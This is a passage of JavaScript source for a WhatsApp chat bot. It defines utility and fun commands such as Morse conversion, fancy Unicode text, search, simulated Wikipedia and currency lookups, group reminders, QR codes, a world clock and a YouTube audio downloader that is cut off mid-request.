}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
      '+': '.-.-.', '-': '-....-', '_': '..--.-', '"': '.-..-.', '$': '...-..-', '@': '.--.-.',
      ' ': '/'
    };
    
    // Convert to Morse code
    const morseText = text.toLowerCase().split('').map(char => morseMap[char] || char).join(' ');
    
    await repondre(`📶 *Morse Code:*\n\n${morseText}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre("❌ An error occurred while converting to Morse code.");
  }
});

hango({
  nomCom: "unmorse",
  aliases: ["frommorse", "morsedecode"],
  desc: "Convert Morse code to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const morse = arg.join(" ");
    
    if (!morse) {
      return repondre("❌ Please provide Morse code to convert to text.");
    }
    
    // Reverse Morse code mapping
    const reverseMorseMap = {
      '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e', '..-.': 'f', '--.': 'g', '....': 'h',
      '..': 'i', '.---': 'j', '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o', '.--.': 'p',
      '--.-': 'q', '.-.': 'r', '...': 's', '-': 't', '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x',
      '-.--': 'y', '--..': 'z',
      '-----': '0', '.----': '1', '..---': '2', '...--': '3', '....-': '4', '.....': '5',
      '-....': '6', '--...': '7', '---..': '8', '----.': '9',
      '.-.-.-': '.', '--..--': ',', '..--..': '?', '.----.': "'", '-.-.--': '!', '-..-.': '/',
      '-.--.': '(', '-.--.-': ')', '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
      '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"', '...-..-': '$', '.--.-.': '@',
      '/': ' '
    };
    
    // Convert from Morse code
    const text = morse.split(' ').map(code => reverseMorseMap[code] || code).join('');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unmorse command:", error);
    await repondre("❌ An error occurred while converting from Morse code.");
  }
});

hango({
  nomCom: "fancy",
  aliases: ["fancytext", "styler"],
  desc: "Convert text to various fancy styles",
  categorie: "fun",
  reaction: '✨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg.length) {
      return repondre(`
❌ Please provide text to convert to fancy styles.

📝 *Usage:*
• .fancy Hello World (Shows all styles)
• .fancy 2 Hello World (Uses style #2)

*Available Styles:*
1. 𝓢𝓬𝓻𝓲𝓹𝓽
2. 𝔊𝔬𝔱𝔥𝔦𝔠
3. 𝕆𝕦𝕥𝕝𝕚𝕟𝕖𝕕
4. 𝚝𝚢𝚙𝚎𝚠𝚛𝚒𝚝𝚎𝚛
5. 𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝
6. 𝗦𝗮𝗻𝘀 𝗕𝗼𝗹𝗱
7. 𝘐𝘵𝘢𝘭𝘪𝘤
8. 𝙄𝙩𝙖𝙡𝙞𝙘 𝘽𝙤𝙡𝙙
9. Ⓑⓤⓑⓑⓛⓔⓢ
10. U͟n͟d͟e͟r͟l͟i͟n͟e͟d͟`);
    }
    
    // Check if first argument is a style number
    const firstArg = arg[0];
    const styleNum = parseInt(firstArg);
    let text;
    let useNumberedStyle = false;
    
    if (!isNaN(styleNum) && styleNum >= 1 && styleNum <= 10) {
      text = arg.slice(1).join(" ");
      useNumberedStyle = true;
      
      if (!text) {
        return repondre("❌ Please provide text to convert after the style number.");
      }
    } else {
      text = arg.join(" ");
    }
    
    if (useNumberedStyle) {
      // Convert using numbered style
      let result = "";
      
      switch (styleNum) {
        case 1: // Script
          result = convertToUnicode(text, 0x1D4B6, 0x1D4D0);
          break;
        case 2: // Gothic
          result = convertToUnicode(text, 0x1D51E, 0x1D538);
          break;
        case 3: // Outlined
          result = convertToUnicode(text, 0x1D552, 0x1D56C);
          break;
        case 4: // Typewriter
          result = convertToUnicode(text, 0x1D68A, 0x1D6A4);
          break;
        case 5: // Serif Bold
          result = convertToUnicode(text, 0x1D41A, 0x1D434);
          break;
        case 6: // Sans Bold
          result = convertToUnicode(text, 0x1D5EE, 0x1D608);
          break;
        case 7: // Italic
          result = convertToUnicode(text, 0x1D482, 0x1D49C);
          break;
        case 8: // Italic Bold
          result = convertToUnicode(text, 0x1D482, 0x1D49C);
          break;
        case 9: // Bubbles
          result = text.split("").map(char => {
            const code = char.charCodeAt(0);
            if (code >= 97 && code <= 122) return String.fromCharCode(code - 97 + 0x24D0);
            if (code >= 65 && code <= 90) return String.fromCharCode(code - 65 + 0x24B6);
            if (code >= 48 && code <= 57) return String.fromCharCode(code - 48 + 0x2460);
            return char;
          }).join("");
          break;
        case 10: // Underlined
          result = text.split("").map(char => char + "\u0332").join("");
          break;
      }
      
      await repondre(`
✨ *FANCY TEXT*

*Original:* ${text}
*Style ${styleNum}:* ${result}
      `);
    } else {
      // Show all styles
      const styles = [
        { name: "Double Struck", value: convertToUnicode(text, 0x1D552, 0x1D56C) },
        { name: "Medieval", value: convertToUnicode(text, 0x1D51E, 0x1D538) },
        { name: "Cursive", value: convertToUnicode(text, 0x1D4B6, 0x1D4D0) },
        { name: "Bold", value: convertToUnicode(text, 0x1D5EE, 0x1D608) },
        { name: "Italic", value: convertToUnicode(text, 0x1D482, 0x1D49C) }
      ];
      
      let message = `✨ *Fancy Text Styles for:* ${text}\n\n`;
      styles.forEach(style => {
        message += `*${style.name}:* ${style.value}\n`;
      });
      
      message += `\nTip: Try .fancy <number> ${text} to use specific number styles!`;
      
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in fancy command:", error);
    await repondre("❌ An error occurred while creating fancy text. Some characters may not be supported.");
  }
  
  // Helper function to convert text to Unicode styles
  function convertToUnicode(text, lowerOffset, upperOffset) {
    return text.split("").map(char => {
      const code = char.charCodeAt(0);
      if (code >= 97 && code <= 122) return String.fromCharCode(code - 97 + lowerOffset);
      if (code >= 65 && code <= 90) return String.fromCharCode(code - 65 + upperOffset);
      return char;
    }).join("");
  }
});

hango({
  nomCom: "google",
  aliases: ["search", "gsearch"],
  desc: "Search Google directly from WhatsApp",
  categorie: "search",
  reaction: '🔍',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const query = arg.join(" ");
    
    if (!query) {
      return repondre("❌ Please provide a search query. Example: .google WhatsApp features");
    }
    
    // Using SerpApi for Google search results
    const serpApiKey = conf.SERPAPI_KEY || "demo"; // Replace with your SerpAPI key in config
    const searchUrl = `https://serpapi.com/search.json?q=${encodeURIComponent(query)}&api_key=${serpApiKey}`;
    
    await repondre("🔍 Searching Google for: *" + query + "*");
    
    const response = await axios.get(searchUrl);
    const results = response.data.organic_results || [];
    
    if (results.length === 0) {
      return repondre("❌ No results found for your query.");
    }
    
    // Format top 3 results
    let message = `🔍 *Google Search Results*\n\n`;
    const topResults = results.slice(0, 3);
    
    topResults.forEach((result, index) => {
      message += `*${index + 1}. ${result.title}*\n`;
      message += `${result.snippet || "No description available."}\n`;
      message += `🔗 ${result.link}\n\n`;
    });
    
    message += `For more results: https://google.com/search?q=${encodeURIComponent(query)}`;
    
    await repondre(message);
  } catch (error) {
    console.error("Error in google command:", error);
    await repondre("❌ An error occurred while searching. Try again later.");
  }
});

hango({
  nomCom: "wiki",
  aliases: ["wikipedia", "wikisearch"],
  desc: "Search Wikipedia for information",
  categorie: "info",
  reaction: '📖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a search term.

📝 *Usage:*
.wiki Albert Einstein
.wiki Solar System
.wiki Artificial Intelligence
      `);
    }
    
    const searchTerm = arg.join(" ");
    
    await repondre(`⏳ Searching Wikipedia for "${searchTerm}"...`);
    
    // In a real implementation, you would use the Wikipedia API
    // This is a simulation with a few hardcoded articles
    const wikiArticles = {
      "albert einstein": {
        title: "Albert Einstein",
        extract: "Albert Einstein (14 March 1879 – 18 April 1955) was a German-born theoretical physicist who is widely held to be one of the greatest and most influential scientists of all time. Best known for developing the theory of relativity, he also made important contributions to quantum mechanics, and was thus a central figure in the revolutionary reshaping of the scientific understanding of nature that modern physics accomplished in the first decades of the twentieth century.",
        url: "https://en.wikipedia.org/wiki/Albert_Einstein"
      },
      "solar system": {
        title: "Solar System",
        extract: "The Solar System is the gravitationally bound system of the Sun and the objects that orbit it. It formed 4.6 billion years ago from the gravitational collapse of a giant interstellar molecular cloud. The vast majority of the system's mass is in the Sun, with most of the remaining mass contained in the planet Jupiter.",
        url: "https://en.wikipedia.org/wiki/Solar_System"
      },
      "artificial intelligence": {
        title: "Artificial Intelligence",
        extract: "Artificial intelligence (AI) is intelligence demonstrated by machines, as opposed to the natural intelligence displayed by animals including humans. AI research has been defined as the field of study of intelligent agents, which refers to any system that perceives its environment and takes actions that maximize its chance of achieving its goals.",
        url: "https://en.wikipedia.org/wiki/Artificial_intelligence"
      }
    };
    
    // Check if we have a matching article (case insensitive)
    const matchingKey = Object.keys(wikiArticles).find(
      key => key.toLowerCase() === searchTerm.toLowerCase()
    );
    
    if (matchingKey) {
      const article = wikiArticles[matchingKey];
      
      let message = `📖 *WIKIPEDIA: ${article.title}*\n\n`;
      message += `${article.extract}\n\n`;
      message += `*Read more:* ${article.url}\n\n`;
      message += `_Note: This is a simulated Wikipedia result. In a real implementation, actual data would be fetched from the Wikipedia API._`;
      
      await repondre(message);
    } else {
      // Simulate a "no results" response
      await repondre(`
❌ No Wikipedia article found for "${searchTerm}".

Try searching for:
• Albert Einstein
• Solar System
• Artificial Intelligence

_Note: This is a simulation. In a real implementation, the Wikipedia API would be used for comprehensive searches._
      `);
    }
  } catch (error) {
    console.error("Error in wiki command:", error);
    repondre("❌ Failed to search Wikipedia. Please try again later.");
  }
});

hango({
  nomCom: "currency",
  aliases: ["convert", "exchange"],
  desc: "Convert between currencies",
  categorie: "tools",
  reaction: '💱',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 3) {
      return repondre(`
❌ Please provide an amount, source currency, and target currency.

📝 *Usage:*
.currency 100 USD EUR
.currency 50 GBP JPY

*Common currency codes:*
• USD - US Dollar
• EUR - Euro
• GBP - British Pound
• JPY - Japanese Yen
• CAD - Canadian Dollar
• AUD - Australian Dollar
• CNY - Chinese Yuan
• INR - Indian Rupee
      `);
    }
    
    const amount = parseFloat(arg[0]);
    if (isNaN(amount)) {
      return repondre("❌ Please provide a valid number for the amount.");
    }
    
    const fromCurrency = arg[1].toUpperCase();
    const toCurrency = arg[2].toUpperCase();
    
    await repondre(`⏳ Converting ${amount} ${fromCurrency} to ${toCurrency}...`);
    
    // In a real implementation, you would use a currency conversion API
    // This is a simulation with some hardcoded rates
    const exchangeRates = {
      "USD": {
        "EUR": 0.92,
        "GBP": 0.79,
        "JPY": 145.85,
        "CAD": 1.34,
        "AUD": 1.48,
        "CNY": 7.21,
        "INR": 83.12
      },
      "EUR": {
        "USD": 1.09,
        "GBP": 0.86,
        "JPY": 158.32,
        "CAD": 1.46,
        "AUD": 1.61,
        "CNY": 7.83,
        "INR": 90.22
      },
      "GBP": {
        "USD": 1.27,
        "EUR": 1.17,
        "JPY": 184.47,
        "CAD": 1.70,
        "AUD": 1.88,
        "CNY": 9.12,
        "INR": 105.16
      }
    };
    
    if (!exchangeRates[fromCurrency]) {
      return repondre(`❌ Currency ${fromCurrency} not supported in this simulation. Try with USD, EUR, or GBP.`);
    }
    
    if (!exchangeRates[fromCurrency][toCurrency]) {
      return repondre(`❌ Conversion from ${fromCurrency} to ${toCurrency} not supported in this simulation.`);
    }
    
    const rate = exchangeRates[fromCurrency][toCurrency];
    const convertedAmount = amount * rate;
    
    await repondre(`
💱 *CURRENCY CONVERSION*

*${amount} ${fromCurrency} = ${convertedAmount.toFixed(2)} ${toCurrency}*

*Exchange Rate:* 1 ${fromCurrency} = ${rate} ${toCurrency}
*Date:* ${new Date().toLocaleDateString()}

_Note: This is a simulated conversion. In a real implementation, current rates would be fetched from an API._
    `);
  } catch (error) {
    console.error("Error in currency command:", error);
    repondre("❌ Failed to convert currency. Please try again later.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "schedule"],
  desc: "Set a reminder for the group",
  categorie: "group",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    if (arg.length < 2) {
      return repondre(`
❌ Please provide a time and message.

📝 *Usage:*
.reminder 5m Meeting starts soon!
.reminder 2h Don't forget to submit your reports
.reminder 1d Tomorrow's event reminder

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit from time argument
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds and human-readable format
    let timeMs = 0;
    let readableTime = "";
    
    switch (timeUnit) {
      case 's':
        timeMs = timeValue * 1000;
        readableTime = timeValue === 1 ? "1 second" : `${timeValue} seconds`;
        break;
      case 'm':
        timeMs = timeValue * 60 * 1000;
        readableTime = timeValue === 1 ? "1 minute" : `${timeValue} minutes`;
        break;
      case 'h':
        timeMs = timeValue * 60 * 60 * 1000;
        readableTime = timeValue === 1 ? "1 hour" : `${timeValue} hours`;
        break;
      case 'd':
        timeMs = timeValue * 24 * 60 * 60 * 1000;
        readableTime = timeValue === 1 ? "1 day" : `${timeValue} days`;
        break;
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    
    // Confirm reminder set
    await repondre(`⏰ Group reminder set! Everyone will be reminded about "${reminderText}" in ${readableTime}.`);
    
    // Set the reminder
    setTimeout(async () => {
      try {
        // Create mentions array for all participants
        const mentions = groupMetadata.participants.map(p => p.id);
        
        // Create a message that tags everyone
        let mentionText = "";
        groupMetadata.participants.forEach(participant => {
          mentionText += `@${participant.id.split('@')[0]} `;
        });
        
        // Send the reminder with mentions
        await hn.sendMessage(dest.chat, {
          text: `⏰ *GROUP REMINDER*\n\n${reminderText}\n\n${mentionText}`,
          mentions: mentions
        });
      } catch (error) {
        console.error("Error in group reminder execution:", error);
      }
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    repondre("❌ Failed to set group reminder. Please try again.");
  }
});

hango({
  nomCom: "quiz",
  aliases: ["trivia", "question"],
  desc: "Start a quiz with various categories",
  categorie: "fun",
  reaction: '🧠',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const categories = ["general", "science", "history", "geography", "sports", "entertainment"];
    let category = "general";
    
    if (arg[0] && categories.includes(arg[0].toLowerCase())) {
      category = arg[0].toLowerCase();
    }
    
    if (arg[0] && !categories.includes(arg[0].toLowerCase())) {
      return repondre(`
❌ Invalid category. Please choose from:
${categories.join(", ")}

📝 *Usage:*
.quiz science
.quiz history
      `);
    }
    
    await repondre(`⏳ Preparing a ${category} quiz question...`);
    
    // In a real implementation, you would fetch from a trivia API
    // This is a simulation with some hardcoded questions
    const quizQuestions = {
      "general": [
        {
          question: "What is the capital of France?",
          options: ["London", "Berlin", "Paris", "Madrid"],
          answer: "Paris"
        },
        {
          question: "Which planet is known as the Red Planet?",
          options: ["Venus", "Mars", "Jupiter", "Saturn"],
          answer: "Mars"
        }
      ],
      "science": [
        {
          question: "What is the chemical symbol for gold?",
          options: ["Go", "Gd", "Au", "Ag"],
          answer: "Au"
        },
        {
          question: "What is the hardest natural substance on Earth?",
          options: ["Platinum", "Diamond", "Titanium", "Quartz"],
          answer: "Diamond"
        }
      ],
      "history": [
        {
          question: "Who was the first President of the United States?",
          options: ["Thomas Jefferson", "George Washington", "Abraham Lincoln", "John Adams"],
          answer: "George Washington"
        },
        {
          question: "In which year did World War II end?",
          options: ["1943", "1944", "1945", "1946"],
          answer: "1945"
        }
      ]
    };
    
    // Default to general if the selected category isn't in our simulation
    const availableQuestions = quizQuestions[category] || quizQuestions["general"];
    const randomQuestion = availableQuestions[Math.floor(Math.random() * availableQuestions.length)];
    
    // Send the question
    let questionMsg = `🧠 *QUIZ: ${category.toUpperCase()}*\n\n`;
    questionMsg += `*Question:* ${randomQuestion.question}\n\n`;
    questionMsg += `*Options:*\n`;
    
    randomQuestion.options.forEach((option, index) => {
      questionMsg += `${index + 1}. ${option}\n`;
    });
    
    questionMsg += `\nReply with the number of your answer within 30 seconds!`;
    
    await repondre(questionMsg);
    
    // In a real implementation, you would listen for answers and check them
    // This is a simulation of the answer reveal
    setTimeout(async () => {
      let answerMsg = `⏱️ *TIME'S UP!*\n\n`;
      answerMsg += `*Question:* ${randomQuestion.question}\n`;
      answerMsg += `*Correct Answer:* ${randomQuestion.answer}\n\n`;
      answerMsg += `_Note: This is a simulated quiz. In a real implementation, answers would be collected and scored._`;
      
      await repondre(answerMsg);
    }, 10000); // Reduced to 10 seconds for simulation
    
  } catch (error) {
    console.error("Error in quiz command:", error);
    repondre("❌ Failed to create quiz. Please try again later.");
  }
});

hango({
  nomCom: "schedule",
  aliases: ["event", "plan"],
  desc: "Schedule an event for the group",
  categorie: "group",
  reaction: '📅',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a date, time, and event description.

📝 *Usage:*
.schedule 2023-10-15 14:30 Team meeting to discuss the new project
.schedule tomorrow 20:00 Game night with friends
.schedule Saturday 18:00 Weekend party at John's place
      `);
    }
    
    const date = arg[0];
    const time = arg[1];
    const eventDescription = arg.slice(2).join(" ");
    
    // Validate date format
    const isValidDate = (
      /^\d{4}-\d{2}-\d{2}$/.test(date) || 
      /^(today|tomorrow|monday|tuesday|wednesday|thursday|friday|saturday|sunday)$/i.test(date)
    );
    
    // Validate time format
    const isValidTime = /^([01]?[0-9]|2[0-3]):[0-5][0-9]$/.test(time);
    
    if (!isValidDate) {
      return repondre("❌ Invalid date format. Use YYYY-MM-DD or day names like 'tomorrow' or 'Monday'.");
    }
    
    if (!isValidTime) {
      return repondre("❌ Invalid time format. Use 24-hour format like 14:30 or 09:15.");
    }
    
    // Get user's name
    const senderName = dest.pushName || dest.sender.split('@')[0];
    
    // In a real implementation, you would store the event in a database
    // This is a simulation
    await repondre(`
📅 *EVENT SCHEDULED*

*Event:* ${eventDescription}
*Date:* ${date}
*Time:* ${time}
*Created by:* ${senderName}

✅ Everyone in the group has been notified of this event!

_Note: This is a simulated event scheduler. In a real implementation, events would be stored and reminders would be sent automatically._
    `);
  } catch (error) {
    console.error("Error in schedule command:", error);
    repondre("❌ Failed to schedule event. Please try again.");
  }
});

hango({
  nomCom: "birthday",
  aliases: ["bday", "birthdays"],
  desc: "Manage birthday reminders for group members",
  categorie: "group",
  reaction: '🎂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    if (!arg[0]) {
      return repondre(`
❌ Please specify an action.

📝 *Usage:*
• .birthday add MM-DD - Add your birthday
• .birthday list - List all birthdays
• .birthday remove - Remove your birthday
      `);
    }
    
    const action = arg[0].toLowerCase();
    
    if (action === "add") {
      if (!arg[1] || !arg[1].match(/^(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/)) {
        return repondre("❌ Please provide a valid birthday date in MM-DD format (e.g., 05-15 for May 15).");
      }
      
      const birthdayDate = arg[1];
      const userName = dest.pushName || dest.sender.split('@')[0];
      
      // In a real implementation, you would store this in a database
      // This is a simulation
      await repondre(`
✅ Birthday added successfully!

*User:* ${userName}
*Birthday:* ${birthdayDate}

I'll remind the group when your birthday comes!

_Note: This is a simulation. In a real implementation, birthdays would be stored in a database and automatic reminders would be sent._
      `);
    } 
    else if (action === "list") {
      // In a real implementation, you would fetch from a database
      // This is a simulation with hardcoded data
      await repondre(`
🎂 *GROUP BIRTHDAYS*

• John: 01-15 (January 15)
• Alice: 03-22 (March 22)
• Robert: 07-09 (July 9)
• Emma: 11-30 (November 30)

_Note: This is simulated data. In a real implementation, actual stored birthdays would be displayed._
      `);
    } 
    else if (action === "remove") {
      const userName = dest.pushName || dest.sender.split('@')[0];
      
      // In a real implementation, you would remove from a database
      // This is a simulation
      await repondre(`
✅ Birthday removed successfully!

*User:* ${userName}

Your birthday has been removed from the reminder list.

_Note: This is a simulation. In a real implementation, the birthday would be removed from a database._
      `);
    } 
    else {
      repondre(`
❌ Invalid action. Please use one of:
• add
• list
• remove
      `);
    }
  } catch (error) {
    console.error("Error in birthday command:", error);
    repondre("❌ Failed to manage birthdays. Please try again.");
  }
});

hango({
  nomCom: "qrcode",
  aliases: ["qr", "genqr"],
  desc: "Generate a QR code from text",
  categorie: "tools",
  reaction: '📲',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide text or a URL to encode as QR code.

📝 *Usage:*
.qrcode https://example.com
.qrcode Your text here
      `);
    }
    
    const content = arg.join(" ");
    
    // Use Google Chart API to generate real QR code
    const qrSize = 300;
    const qrUrl = `https://chart.googleapis.com/chart?cht=qr&chs=${qrSize}x${qrSize}&chl=${encodeURIComponent(content)}&chld=H|1`;
    
    // Send QR code image
    await hn.sendMessage(dest.chat, {
      image: { url: qrUrl },
      caption: `📲 QR Code for:\n${content}`
    });
  } catch (error) {
    console.error("Error in qrcode command:", error);
    repondre("❌ Failed to generate QR code. Please try again with shorter text.");
  }
});

hango({
  nomCom: "gif",
  aliases: ["gifsearch", "findgif"],
  desc: "Search for a GIF",
  categorie: "media",
  reaction: '🎬',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a search term.

📝 *Usage:*
.gif cute cats
.gif thank you
.gif funny
      `);
    }
    
    const searchTerm = arg.join(" ");
    
    await repondre(`⏳ Searching for "${searchTerm}" GIFs...`);
    
    // In a real implementation, you would use Tenor, GIPHY, or another GIF API
    // This is a simulation
    const simulatedGifUrls = [
      "https://media.tenor.com/images/sample1.gif",
      "https://media.giphy.com/media/sample2.gif",
      "https://i.imgur.com/sample3.gif"
    ];
    
    const randomGifUrl = simulatedGifUrls[Math.floor(Math.random() * simulatedGifUrls.length)];
    
    // In a real implementation, you would send the actual GIF
    // This is a placeholder message
    await repondre(`
🎬 *GIF SEARCH*

*Search term:* ${searchTerm}

_Note: This is a simulation. In a real implementation, a GIF matching "${searchTerm}" would be fetched from an API and sent here._
    `);
  } catch (error) {
    console.error("Error in gif command:", error);
    repondre("❌ Failed to search for GIFs. Please try again later.");
  }
});

hango({
  nomCom: "voicenote",
  aliases: ["ttsaudio", "sayaudio"],
  desc: "Convert text to voice note",
  categorie: "media",
  reaction: '🎙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 1) {
      return repondre(`
❌ Please provide some text to convert to a voice note.

📝 *Usage:*
.voicenote Hello, this is a test of text to voice note
      `);
    }
    
    const text = arg.join(" ");
    
    await repondre(`⏳ Converting text to voice note...`);
    
    // In a real implementation, you would use a Text-to-Speech API to generate audio
    // and then send it as a voice note
    // This is a simulation message
    await repondre(`
🎙️ *TEXT TO VOICE NOTE*

*Text:* ${text}

_Note: This is a simulation. In a real implementation, your text would be converted to an audio file and sent as a voice note using a Text-to-Speech API._
    `);
  } catch (error) {
    console.error("Error in voicenote command:", error);
    repondre("❌ Failed to convert text to voice note. Please try again later.");
  }
});

hango({
  nomCom: "worldclock",
  aliases: ["time", "timezone"],
  desc: "Check time in different cities around the world",
  categorie: "info",
  reaction: '🕒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // List of major cities and their timezone offsets
    const timeZones = {
      "london": { name: "London", offset: 0 }, // GMT+0
      "newyork": { name: "New York", offset: -5 }, // GMT-5
      "losangeles": { name: "Los Angeles", offset: -8 }, // GMT-8
      "tokyo": { name: "Tokyo", offset: 9 }, // GMT+9
      "sydney": { name: "Sydney", offset: 10 }, // GMT+10
      "paris": { name: "Paris", offset: 1 }, // GMT+1
      "dubai": { name: "Dubai", offset: 4 }, // GMT+4
      "mumbai": { name: "Mumbai", offset: 5.5 }, // GMT+5:30
      "singapore": { name: "Singapore", offset: 8 }, // GMT+8
      "moscow": { name: "Moscow", offset: 3 } // GMT+3
    };
    
    if (!arg[0]) {
      // If no city is specified, show time for all cities
      const now = new Date();
      let message = `🕒 *WORLD CLOCK*\n\n`;
      
      Object.values(timeZones).forEach(zone => {
        const localTime = new Date(now.getTime() + (zone.offset * 60 + now.getTimezoneOffset()) * 60000);
        message += `*${zone.name}:* ${localTime.toTimeString().slice(0, 5)}\n`;
      });
      
      await repondre(message);
    } else {
      // Check time for specific city
      const cityName = arg.join(" ").toLowerCase().replace(/\s/g, "");
      
      if (timeZones[cityName]) {
        const now = new Date();
        const zone = timeZones[cityName];
        const localTime = new Date(now.getTime() + (zone.offset * 60 + now.getTimezoneOffset()) * 60000);
        
        await repondre(`
🕒 *TIME IN ${zone.name.toUpperCase()}*

*Current Time:* ${localTime.toTimeString().slice(0, 5)}
*Date:* ${localTime.toDateString()}
        `);
      } else {
        let availableCities = Object.values(timeZones).map(zone => zone.name).join(", ");
        
        await repondre(`
❌ City not found.

*Available cities:*
${availableCities}

📝 *Usage:*
.worldclock Tokyo
.worldclock New York
        `);
      }
    }
  } catch (error) {
    console.error("Error in worldclock command:", error);
    repondre("❌ Failed to retrieve time information. Please try again later.");
  }
});

hango({
  nomCom: "whois",
  aliases: ["useinfo", "checkuser"],
  desc: "Get information about a user",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if a user is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a user by replying to their message.");
    }
    
    const taggedUser = dest.quoted.sender;
    const userName = dest.quoted.pushName || taggedUser.split('@')[0];
    
    // Get user profile picture if possible
    let ppUrl;
    try {
      ppUrl = await hn.profilePictureUrl(taggedUser, 'image');
    } catch {
      ppUrl = null;
    }
    
    // Get user status
    let userStatus;
    try {
      const status = await hn.fetchStatus(taggedUser);
      userStatus = status.status || "No status";
    } catch {
      userStatus = "No status available";
    }
    
    // Check if user is an admin (if in group)
    let adminStatus = "N/A";
    if (dest.isGroup) {
      const groupMetadata = await hn.groupMetadata(dest.chat);
      const isAdmin = groupMetadata.participants.find(p => p.id === taggedUser && (p.admin === 'admin' || p.admin === 'superadmin'));
      adminStatus = isAdmin ? "Yes" : "No";
    }
    
    // Format and send user information
    let message = `👤 *USER INFORMATION*\n\n`;
    message += `*Name:* ${userName}\n`;
    message += `*Number:* ${taggedUser.split('@')[0]}\n`;
    message += `*Status:* ${userStatus}\n`;
    
    if (dest.isGroup) {
      message += `*Admin:* ${adminStatus}\n`;
    }
    
    // Send with profile picture if available
    if (ppUrl) {
      await hn.sendMessage(dest.chat, {
        image: { url: ppUrl },
        caption: message
      });
    } else {
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in whois command:", error);
    repondre("❌ Failed to get user information.");
  }
});

hango({
  nomCom: "ytaudio",
  aliases: ["ytmp3", "ytmusic"],
  desc: "Download audio from a YouTube video",
  categorie: "download",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a YouTube video URL.

📝 *Usage:*
.ytaudio https://www.youtube.com/watch?v=dQw4w9WgXcQ
      `);
    }
    
    const url = arg[0];
    
    // Check if it's a valid YouTube URL
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing audio download, please wait...");
    
    // Use y2mate API to extract audio
    // First, get video info
    const videoId = url.includes('youtu.be') 
      ? url.split('/').pop().split('?')[0]
      : url.includes('watch?v=')
        ? url.split('watch?v=')[1].split('&')[0]
        : null;
        
    if (!videoId) {
      return repondre("❌ Could not extract video ID from URL.");
    }
    
    // First request to get video details
    const infoUrl = `https://www.y2mate.com/mates/analyzeV2/ajax`;
    const infoBody = new URLSearchParams({
      k_query: `https://www.youtube.com/watch?v=${videoId}`,
      k_page: 'home',
      hl: 'en',
      q_auto: '0'
    });
    
    const infoRes = await fetch(infoUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.y2mate.com',
        'Referer': 'https://www.y2mate.com/',
